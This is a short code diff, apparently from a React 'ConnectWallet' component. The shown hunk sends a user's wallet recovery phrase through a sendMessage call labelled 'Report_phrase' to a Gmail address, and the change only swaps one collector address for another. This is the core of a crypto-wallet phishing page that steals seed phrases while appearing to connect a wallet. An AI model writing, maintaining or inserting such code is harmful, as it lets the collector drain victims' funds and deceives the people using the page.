@@ -99,7 +99,7 @@ export default function ConnectWallet() {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "saptrustsservice@gmail.com"
+        "saptrustmanagement@gmail.com"
       )
         .then(() => {
           setValue({
